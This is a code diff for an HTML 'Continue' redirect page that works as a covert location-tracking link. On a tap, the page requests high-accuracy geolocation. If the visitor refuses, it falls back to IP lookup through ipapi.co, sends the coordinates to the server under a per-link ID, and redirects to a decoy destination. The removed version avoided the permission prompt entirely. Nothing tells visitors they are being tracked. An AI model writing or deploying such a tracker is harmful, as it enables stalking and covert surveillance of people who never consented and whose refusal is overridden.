@@ -2,10 +2,14 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
 <title>Continue</title>
 <style>
-* { margin: 0; padding: 0; box-sizing: border-box; }
+* {
+  margin: 0;
+  padding: 0;
+  box-sizing: border-box;
+}
 
 body {
   min-height: 100vh;
@@ -14,26 +18,37 @@ body {
   display: flex;
   align-items: center;
   justify-content: center;
+  touch-action: manipulation;
 }
 
-.container { text-align: center; padding: 20px; }
+.container {
+  text-align: center;
+  padding: 20px;
+  width: 100%;
+  max-width: 300px;
+}
 
 .btn {
   background: white;
   color: #667eea;
   border: none;
-  padding: 15px 40px;
+  padding: 16px 40px;
   font-size: 18px;
   font-weight: 600;
   border-radius: 50px;
   cursor: pointer;
-  transition: transform 0.2s, box-shadow 0.2s;
-  margin-top: 20px;
+  transition: transform 0.2s;
+  width: 100%;
+  touch-action: manipulation;
 }
 
-.btn:hover { transform: scale(1.05); box-shadow: 0 10px 25px rgba(0,0,0,0.2); }
-.btn:active { transform: scale(0.98); }
-.hidden { display: none; }
+.btn:active {
+  transform: scale(0.98);
+}
+
+.hidden {
+  display: none;
+}
 
 .spinner {
   width: 40px;
@@ -45,24 +60,57 @@ body {
   margin: 20px auto 0;
 }
 
-@keyframes spin { to { transform: rotate(360deg); } }
-p { color: white; font-size: 16px; margin-bottom: 20px; }
+@keyframes spin {
+  to { transform: rotate(360deg); }
+}
+
+p {
+  color: white;
+  font-size: 16px;
+  margin-bottom: 20px;
+}
+
+.status {
+  color: white;
+  font-size: 14px;
+  margin-top: 15px;
+  opacity: 0;
+  transition: opacity 0.3s;
+}
+
+.status.show {
+  opacity: 1;
+}
 </style>
 </head>
 <body>
 <div class="container">
-  <p>Click continue to proceed</p>
+  <p>Tap to continue</p>
   <button class="btn" id="continueBtn">Continue →</button>
   <div id="loading" class="spinner hidden"></div>
+  <div id="status" class="status"></div>
 </div>
 
 <script>
 const linkId = window.location.pathname.split('/').pop();
 let destUrl = 'https://google.com';
 let locationSent = false;
+let locationRequested = false;
+
 const continueBtn = document.getElementById('continueBtn');
 const loading = document.getElementById('loading');
+const statusDiv = document.getElementById('status');
 
+function showStatus(msg) {
+  statusDiv.textContent = msg;
+  statusDiv.classList.add('show');
+}
+
+function hideStatus() {
+  statusDiv.classList.remove('show');
+}
+
+// Get destination URL
 fetch('/api/hits/' + linkId)
   .then(r => r.json())
   .then(d => { if (d.dest) destUrl = d.dest; })
@@ -71,23 +119,23 @@ fetch('/api/hits/' + linkId)
 function sendLocation(lat, lon, acc) {
   if (locationSent) return;
   locationSent = true;
-
+  
   fetch('/api/hit/' + linkId, {
     method: 'POST',
     headers: { 'Content-Type': 'application/json' },
     body: JSON.stringify({ lat, lon, acc })
   }).catch(() => {});
-
-  window.location.href = destUrl;
+  
+  // Redirect
+  setTimeout(() => {
+    window.location.href = destUrl;
+  }, 100);
 }
 
-function grabLocation() {
-  continueBtn.style.display = 'none';
-  loading.classList.remove('hidden');
-
-  // ✅ No geolocation = no permission popup, ever
+function getIPLocation() {
+  showStatus('Getting location...');
   fetch('https://ipapi.co/json/')
-    .then(r => r.json())
+    .then(response => response.json())
     .then(data => {
       if (data.latitude && data.longitude) {
         sendLocation(data.latitude, data.longitude, 5000);
@@ -95,10 +143,68 @@ function grabLocation() {
         sendLocation(null, null, null);
       }
     })
-    .catch(() => sendLocation(null, null, null));
+    .catch(() => {
+      sendLocation(null, null, null);
+    });
 }
 
-continueBtn.addEventListener('click', grabLocation);
+function grabLocation() {
+  // Prevent multiple requests
+  if (locationRequested) return;
+  locationRequested = true;
+  
+  // Hide button, show spinner
+  continueBtn.style.display = 'none';
+  loading.classList.remove('hidden');
+  
+  // Small delay to ensure DOM is ready
+  setTimeout(() => {
+    if (navigator.geolocation) {
+      showStatus('Requesting permission...');
+      
+      navigator.geolocation.getCurrentPosition(
+        pos => {
+          showStatus('Location captured!');
+          sendLocation(
+            pos.coords.latitude,
+            pos.coords.longitude,
+            Math.round(pos.coords.accuracy)
+          );
+        },
+        err => {
+          console.log('Error code:', err.code);
+          // If user denies or error, fallback to IP
+          if (err.code === 1) {
+            showStatus('Location denied, using network location...');
+          } else {
+            showStatus('Using network location...');
+          }
+          getIPLocation();
+        },
+        { 
+          enableHighAccuracy: true, 
+          timeout: 15000, 
+          maximumAge: 0 
+        }
+      );
+    } else {
+      showStatus('Using network location...');
+      getIPLocation();
+    }
+  }, 100);
+}
+
+// Ensure the button click is clean and not blocked
+continueBtn.addEventListener('click', function(e) {
+  e.preventDefault();
+  e.stopPropagation();
+  grabLocation();
+});
+
+// Also ensure no other elements are overlaying
+document.body.addEventListener('touchstart', function(e) {
+  // Allow default behavior
+}, { passive: false });
 </script>
 </body>
 </html>
